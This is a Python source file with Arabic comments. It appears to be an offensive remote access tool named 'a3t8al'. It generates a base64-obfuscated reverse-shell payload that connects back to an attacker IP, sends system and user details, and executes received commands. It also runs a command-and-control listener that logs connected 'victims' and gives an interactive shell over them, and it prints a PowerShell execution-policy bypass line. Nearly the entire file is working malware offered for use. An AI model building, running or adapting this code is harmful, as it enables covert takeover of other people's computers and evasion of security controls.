import os
import socket
import threading
import base64
import random
import string
from datetime import datetime

# --- إعدادات النظام ---
LHOST = "192.168.1.6" # الآي بي حقك
LPORT = 5555
sessions = {} # لتخزين الجلسات النشطة {ID: (socket, addr)}

def clear(): os.system('clear')

def banner():
    print(f"""
    \033[31m
    █████╗ ██████╗ ████████╗ █████╗  █████╗ ██╗     
    ██╔══██╗╚════██╗╚══██╔══╝██╔══██╗██╔══██╗██║     
    ███████║ █████╔╝   ██║   ███████║███████║██║     
    ██╔══██║ ╚═══██╗   ██║   ██╔══██║██╔══██║██║     
    ██║  ██║██████╔╝   ██║   ██║  ██║██║  ██║███████╗
    ╚═╝  ╚═╝╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ v1.0
    \033[0m [ Developed by a3t8al ]
    """)

# --- [1] إدارة الجلسات السابقة والبيانات المسحوبة ---
def view_logs():
    clear()
    print("📂 [ سجلات الضحايا السابقة ]")
    if not os.path.exists("logs"):
        print("📭 لا توجد سجلات حالياً.")
    else:
        for file in os.listdir("logs"):
            with open(f"logs/{file}", "r") as f:
                print(f"--- Victim: {file} ---\n{f.read()}\n")
    input("\nاضغط Enter للعودة...")

# --- [2] إنشاء بايلود مشفر (Advanced Encryption) ---
def build_payload():
    clear()
    print("🛠️ [ إنشاء بايلود مشفر ]")
    filename = input("أدخل اسم الملف (مثلاً a3t8al_v1): ") + ".py"
    
    # كود الضحية الأساسي (مدمج مع سحب البيانات)
    raw_code = f"""
import socket, subprocess, os, platform, requests
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{LHOST}", {LPORT}))
    # سحب معلومات وتوكنات (تبسيط)
    info = f"OS: {{platform.system()}} | User: {{os.getlogin()}}"
    s.send(info.encode())
    while True:
        cmd = s.recv(1024).decode()
        if cmd == 'exit': break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
connect()
"""
    # نظام تشفير متعدد الطبقات
    secret_key = "".join(random.choices(string.ascii_letters, k=16))
    encoded = base64.b64encode(raw_code.encode()).decode()
    # طبقة تمويه إضافية
    obfuscated = f"import base64; __='{encoded}'; exec(base64.b64decode(__))"
    
    with open(filename, "w") as f:
        f.write(obfuscated)
    print(f"✅ تم إنشاء البايلود المشفر: {filename}")
    input("\nاضغط Enter للعودة...")

# --- [3] تحويل الملف (EXE/BAT/PowerShell) ---
def convert_payload():
    clear()
    print("🔄 [ تحويل البايلود ]")
    print("1. تحويل لـ PowerShell (One-Liner)")
    print("2. تحويل لـ BAT (Windows Script)")
    opt = input("اختر النوع: ")
    if opt == "1":
        print("\n[+] PowerShell Command:\npowershell -ExecutionPolicy Bypass -File a3t8al_v1.py")
    elif opt == "2":
        print("\n[+] BAT Script:\n@echo off\npython a3t8al_v1.py\nexit")
    input("\nاضغط Enter للعودة...")

# --- [4] إدارة الجلسات المباشرة (C2 Control) ---
def manage_sessions():
    while True:
        clear()
        print("👥 [ الجلسات المتاحة ]")
        for i, (sid, (conn, addr)) in enumerate(sessions.items()):
            print(f"[{i}] - IP: {addr[0]} | ID: {sid}")
        
        choice = input("\nأدخل رقم الجلسة للتحكم (أو x للعودة): ")
        if choice.lower() == 'x': break
        
        try:
            target_id = list(sessions.keys())[int(choice)]
            target_conn = sessions[target_id][0]
            shell_control(target_conn)
        except: print("❌ اختيار خاطئ.")

def shell_control(conn):
    print("\n[!] أنت الآن تتحكم بالضحية. اكتب 'help' للأوامر أو 'x' للخروج.")
    while True:
        cmd = input("a3t8al@shell:~$ ")
        if cmd.lower() == 'x': break
        if not cmd: continue
        conn.send(cmd.encode())
        print(conn.recv(4096).decode())

# --- محرك السيرفر (Server Engine) ---
def server_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LHOST, LPORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        sid = "".join(random.choices(string.digits, k=5))
        sessions[sid] = (conn, addr)
        # حفظ لوق تلقائي للجلسة
        if not os.path.exists("logs"): os.makedirs("logs")
        with open(f"logs/victim_{sid}.txt", "w") as f:
            f.write(f"Connected: {datetime.now()}\nIP: {addr[0]}")

# --- القائمة الرئيسية ---
def main():
    # تشغيل المستمع في الخلفية
    threading.Thread(target=server_listener, daemon=True).start()
    
    while True:
        clear()
        banner()
        print("1. عرض الجلسات السابقة (Logs & Cookies)")
        print("2. بناء بايلود .py مشفر (Encryption Level: High)")
        print("3. تحويل البايلود (EXE / PowerShell / BAT)")
        print("4. الجلسات النشطة والتحكم (Live C2)")
        print("0. خروج")
        
        choice = input("\n>> ")
        if choice == "1": view_logs()
        elif choice == "2": build_payload()
        elif choice == "3": convert_payload()
        elif choice == "4": manage_sessions()
        elif choice == "0": break

if __name__ == "__main__":
    main()
